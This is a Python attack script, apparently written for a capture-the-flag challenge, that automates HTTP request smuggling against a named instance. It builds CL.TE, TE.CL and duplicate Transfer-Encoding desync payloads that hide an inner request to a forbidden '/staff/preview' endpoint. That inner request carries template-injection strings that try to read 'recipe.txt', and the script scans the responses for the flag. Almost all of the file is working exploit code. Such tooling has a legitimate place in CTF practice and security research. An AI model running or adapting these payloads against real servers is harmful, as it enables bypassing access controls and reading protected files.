#!/usr/bin/env python3
"""FortID Sticky Headers: focused HTTP transfer-encoding/desync experiment.
Use only against the provided CTF instance.

Python 3 stdlib only. Saves all raw requests/responses locally.
The script deliberately distinguishes observations from hypothesized bypasses.
"""
import argparse
import concurrent.futures
import gzip
import json
import re
import socket
import ssl
import sys
import time
from pathlib import Path
from urllib.parse import urlencode

TE_VALUES = [
    "gzip, chunked", "gzip,chunked",
    "identity, chunked", "identity,chunked",
    "chunked, gzip", "chunked,gzip",
    "chunked, chunked", "chunked,chunked",
    "compress, chunked", "deflate, chunked",
    "chunked", "gzip",
]
VERSIONS = ["1", "0", "2"]


def request(method, path, host, headers, body=b""):
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}",
             "User-Agent: StickyHeaders-CTF-Research/1"]
    lines += [f"{name}: {value}" for name, value in headers]
    return ("\r\n".join(lines) + "\r\n\r\n").encode("ascii") + body


def chunk(body):
    return ("%X\r\n" % len(body)).encode("ascii") + body + b"\r\n0\r\n\r\n"


def encode_body(body, te, encoding):
    if encoding == "chunk_plain":
        return chunk(body)
    if encoding == "chunk_gzip":
        return chunk(gzip.compress(body))
    if encoding == "chunk_deflate":
        import zlib
        return chunk(zlib.compress(body))
    if encoding == "raw":
        return body
    raise ValueError(encoding)


def prepare_direct(host, version, te, enc, length_mode):
    # A direct request should ordinarily get 403. Other results are high signal.
    payload = urlencode({"message": "{{7*7}} recipe.txt"}).encode()
    body = encode_body(payload, te, enc)
    headers = [("X-Client-Version", version),
               ("Content-Type", "application/x-www-form-urlencoded"),
               ("Transfer-Encoding", te)]
    if length_mode == "actual":
        headers.append(("Content-Length", str(len(body))))
    elif length_mode == "zero":
        headers.append(("Content-Length", "0"))
    if "gzip" in enc:
        headers.append(("Content-Encoding", "gzip"))
    elif "deflate" in enc:
        headers.append(("Content-Encoding", "deflate"))
    return request("POST", "/staff/preview", host, headers, body)


def prepare_smuggle(host, version, te, cl_mode, inner_path, trailing):
    msg = urlencode({"message": '{{7*7}} {{.}} {{readFile "recipe.txt"}}'}).encode()
    inner = request("POST" if inner_path == "/staff/preview" else "GET",
                    inner_path, host,
                    ([("Content-Type", "application/x-www-form-urlencoded"),
                      ("Content-Length", str(len(msg))),
                      ("Connection", "close")] if inner_path == "/staff/preview"
                     else [("Connection", "close")]),
                    msg if inner_path == "/staff/preview" else b"")
    # In TE.CL or CL.TE desyncs, a parser may disagree on the next request start.
    if trailing == "terminator":
        body = b"0\r\n\r\n" + inner
    elif trailing == "chunk":
        body = chunk(b"order=hello") + inner
    elif trailing == "gzip":
        body = chunk(gzip.compress(b"order=hello")) + inner
    else:
        raise ValueError(trailing)
    if cl_mode == "full":
        content_length = str(len(body))
    elif cl_mode == "first":
        content_length = "5"
    elif cl_mode == "short":
        content_length = str(len(body) - len(inner))
    else:
        raise ValueError(cl_mode)
    return request("POST", "/order", host, [
        ("X-Client-Version", version),
        ("Content-Type", "application/x-www-form-urlencoded"),
        ("Content-Length", content_length),
        ("Transfer-Encoding", te),
        ("Connection", "keep-alive")], body)


def prepare_smuggle_dup(host, version, first, second, inner_path):
    # Duplicate TE headers, first and last may be treated differently.
    msg = urlencode({"message": '{{7*7}} {{readFile "recipe.txt"}}'}).encode()
    inner = request("POST" if inner_path == "/staff/preview" else "GET",
                    inner_path, host,
                    [("Content-Length", str(len(msg))),
                     ("Content-Type", "application/x-www-form-urlencoded")] if msg and inner_path == "/staff/preview" else [],
                    msg if inner_path == "/staff/preview" else b"")
    body = b"0\r\n\r\n" + inner
    return request("POST", "/order", host, [
        ("X-Client-Version", version),
        ("Content-Type", "application/x-www-form-urlencoded"),
        ("Content-Length", str(len(body))),
        ("Transfer-Encoding", first),
        ("Transfer-Encoding", second)], body)


def build_cases(host):
    cases = []

    def add(label, kind, expected, req):
        cases.append((label, kind, expected, req))

    add("control_order", "control", "200",
        request("POST", "/order", host, [
            ("X-Client-Version", "2"),
            ("Content-Type", "application/x-www-form-urlencoded"),
            ("Content-Length", "11")], b"order=hello"))
    control_body = b"message=hello"
    add("control_staff", "control", "403",
        request("POST", "/staff/preview", host, [
            ("X-Client-Version", "2"),
            ("Content-Type", "application/x-www-form-urlencoded"),
            ("Content-Length", str(len(control_body)))], control_body))
    # First check direct access: gateway/body parser inconsistencies.
    for v in VERSIONS:
        for te in TE_VALUES:
            for enc, lm in [("chunk_plain", "none"), ("chunk_plain", "actual"),
                            ("chunk_gzip", "actual")]:
                add(f"direct/v{v}/te={te}/enc={enc}/cl={lm}",
                    "direct", "403",
                    prepare_direct(host, v, te, enc, lm))

    # Then test for a second HTTP response smuggled behind a benign /order.
    for v in ("1", "2"):
        for te in TE_VALUES[:10]:
            for mode, trailing in [("full", "terminator"),
                                   ("first", "terminator"),
                                   ("full", "chunk"),
                                   ("short", "gzip")]:
                for inner_path in ("/robots.txt", "/staff/preview"):
                    suffix = "staff" if inner_path == "/staff/preview" else "robots"
                    add(f"smuggle/v{v}/te={te}/cl={mode}/body={trailing}/{suffix}",
                        "staff" if suffix == "staff" else "smuggle", "200",
                        prepare_smuggle(host, v, te, mode, inner_path, trailing))

    for v in ("1", "2"):
        for first, second in [("gzip", "chunked"), ("chunked", "gzip"),
                              ("identity", "chunked"), ("chunked", "identity")]:
            for path in ("/robots.txt", "/staff/preview"):
                suffix = "staff" if path.endswith("preview") else "robots"
                add(f"dup/v{v}/te={first}+{second}/{suffix}",
                    "staff" if suffix == "staff" else "smuggle", "200",
                    prepare_smuggle_dup(host, v, first, second, path))

    return cases


def exchange(host, port, payload, deadline, insecure=True):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    data = bytearray()
    started = time.monotonic()
    state = "ok"
    try:
        s = socket.create_connection((host, port), timeout=deadline)
        s.settimeout(deadline)
        with ctx.wrap_socket(s, server_hostname=host) as conn:
            conn.sendall(payload)
            # Read responses until close. Idle timeout means no full response.
            while len(data) < 256_000:
                try:
                    got = conn.recv(16384)
                except socket.timeout:
                    state = "timeout"
                    break
                if not got:
                    break
                data.extend(got)
    except Exception as ex:
        state = type(ex).__name__ + ":" + str(ex)[:110]
    return bytes(data), state, round(time.monotonic() - started, 3)


def analyze(case, host, port, timeout):
    label, kind, expected, req = case
    response, state, elapsed = exchange(host, port, req, timeout)
    status = re.search(rb"HTTP/\d(?:\.\d)?[ \t]+(\d{3})", response)
    status = status.group(1).decode() if status else None
    count = len(re.findall(rb"HTTP/\d(?:\.\d)?[ \t]+\d{3}", response))
    flag = [x.decode("ascii", "replace") for x in
            re.findall(rb"FortID\{[^}\r\n]{1,200}\}", response)]
    signs = ["FortID{" in response.decode("latin-1"), b"User-agent: *" in response,
             b"recipe.txt" in response, b"49" in response]
    # A timeout on a body-framing discrepancy is diagnostically relevant, but
    # not evidence of success. A second HTTP response or flag is high signal.
    finding = bool(flag or count > 1 or
                   (kind == "direct" and status not in (None, "403")) or
                   (kind in ("smuggle", "staff") and b"User-agent: *" in response) or
                   (kind == "staff" and b"Staff" in response))
    return dict(label=label, kind=kind, expected=expected,
                status=status, responses=count, bytes=len(response),
                elapsed=elapsed, state=state, flag=flag, finding=finding,
                signs=signs, request=req, response=response)


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--host", default="sticky-headers-a2ed0b3a35ad.inst6.ctf.fortid.com")
    ap.add_argument("--port", type=int, default=1337)
    ap.add_argument("--timeout", type=float, default=3.0)
    ap.add_argument("--workers", type=int, default=4)
    ap.add_argument("--limit", type=int, default=300)
    ap.add_argument("--only", choices=["all", "direct", "smuggle", "staff", "control"], default="all")
    ap.add_argument("--output", default="sticky_desync_results")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()
    cases = build_cases(args.host)
    if args.only != "all":
        cases = [x for x in cases if x[1] == args.only]
    cases = cases[:args.limit]
    folder = Path(args.output)
    folder.mkdir(parents=True, exist_ok=True)
    print(f"TARGET {args.host}:{args.port} | {len(cases)} probes | {args.workers} workers", flush=True)
    if args.dry_run:
        for ix, case in enumerate(cases):
            if ix < 15:
                print(ix, case[0], repr(case[3][:200]))
        print("Dry run completed (no network connections).")
        return

    # Abort if the old instance hostname is no longer reachable. An expired CTF
    # instance otherwise produces hundreds of identical DNS errors.
    try:
        socket.getaddrinfo(args.host, args.port, type=socket.SOCK_STREAM)
    except OSError as ex:
        print(f"Hostname or network unavailable: {ex}")
        print("Pass --host NEW_INSTANCE_HOST from the currently running CTF instance.")
        return
    control = [analyze(x, args.host, args.port, args.timeout) for x in cases if x[1] == "control"]
    if control and all(c["status"] is None for c in control):
        print("Controls failed (no HTTP status). Not running further probes.")
        for c in control:
            print(c["label"], c["state"])
        print("Check the instance is active and use --host NEW_INSTANCE_HOST.")
        return
    output = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as pool:
        future_to_ix = {pool.submit(analyze, case, args.host, args.port, args.timeout): i
                        for i, case in enumerate(cases)}
        for future in concurrent.futures.as_completed(future_to_ix):
            i = future_to_ix[future]
            item = future.result()
            rq, rs = item.pop("request"), item.pop("response")
            folder.joinpath(f"{i:03}_req.bin").write_bytes(rq)
            folder.joinpath(f"{i:03}_res.bin").write_bytes(rs)
            item["index"] = i
            output.append(item)
            star = " >>> DIFFERENCE" if item["finding"] else ""
            if i < 8 or item["finding"] or item["flag"] or i % 20 == 0:
                print(f"[{i:03}] {item['kind']:7} HTTP {str(item['status']):4} "
                      f"{item['bytes']:5} bytes {item['elapsed']:5.2f}s "
                      f"{item['state'][:24]:24} {item['label'][:74]}{star}", flush=True)
                if item["flag"]:
                    print("FLAG:", item["flag"], flush=True)
    output.sort(key=lambda o: o["index"])
    folder.joinpath("summary.json").write_text(json.dumps(output, ensure_ascii=False, indent=2))
    counts = {}
    for o in output:
        key = (o["kind"], o["status"], o["state"])
        counts[key] = counts.get(key, 0) + 1
    print("\nSTATUS GROUPS:")
    for k, v in sorted(counts.items(), key=lambda x: str(x[0])):
        print(f"{v:3} × {k}")
    findings = [o for o in output if o["finding"]]
    print(f"\nFINDINGS {len(findings)}:")
    for o in findings[:40]:
        print(f"  [{o['index']:03}] {o['label']} - {o['status']} ({o['bytes']} bytes)")
    if not findings:
        print("No direct bypass/second HTTP response detected in these probes.")
        print("This does NOT rule out request smuggling with a delayed cross-connection response.")
    print("Full requests, responses and metadata saved to", folder)


if __name__ == "__main__":
    main()
